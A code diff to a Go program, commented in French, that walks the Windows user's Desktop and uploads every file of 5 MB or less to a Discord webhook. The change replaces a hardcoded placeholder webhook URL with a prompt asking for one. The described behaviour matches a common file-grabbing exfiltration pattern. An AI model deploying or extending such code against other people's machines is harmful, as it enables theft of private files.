@@ -1,11 +1,12 @@
 // Ce programme en Go envoie les fichiers présents sur le bureau de l'utilisateur Windows
-// vers un webhook Discord. Seuls les fichiers de taille inférieure ou égale à 5 Mo sont envoyés.
-// Le programme parcourt chaque fichier, vérifie sa taille, et si elle est dans la limite, il
-// envoie le fichier au webhook sous forme de pièce jointe.
+// vers un webhook Discord spécifié par l'utilisateur. Seuls les fichiers de taille inférieure
+// ou égale à 5 Mo sont envoyés. Le programme parcourt chaque fichier, vérifie sa taille,
+// et s'il est dans la limite, il l'envoie au webhook sous forme de pièce jointe.
 
 package main
 
 import (
+    "bufio"
     "bytes"
     "fmt"
     "io/ioutil"
@@ -19,11 +20,14 @@ import (
 const maxFileSize = 5 * 1024 * 1024
 
 func main() {
+    // Demande à l'utilisateur l'URL du webhook Discord
+    fmt.Print("Veuillez entrer l'URL du webhook Discord : ")
+    scanner := bufio.NewScanner(os.Stdin)
+    scanner.Scan() // Lit l'entrée utilisateur
+    webhookURL := scanner.Text()
+
     // Construit le chemin vers le bureau de l'utilisateur courant en utilisant la variable d'environnement USERPROFILE
     desktopPath := filepath.Join(os.Getenv("USERPROFILE"), "Desktop")
-
-    // URL du webhook Discord vers lequel les fichiers seront envoyés
-    webhookURL := "https://discord.com/api/webhooks/YOUR_WEBHOOK_URL"
 
     // Récupère la liste des fichiers présents dans le répertoire du bureau
     files, err := ioutil.ReadDir(desktopPath)
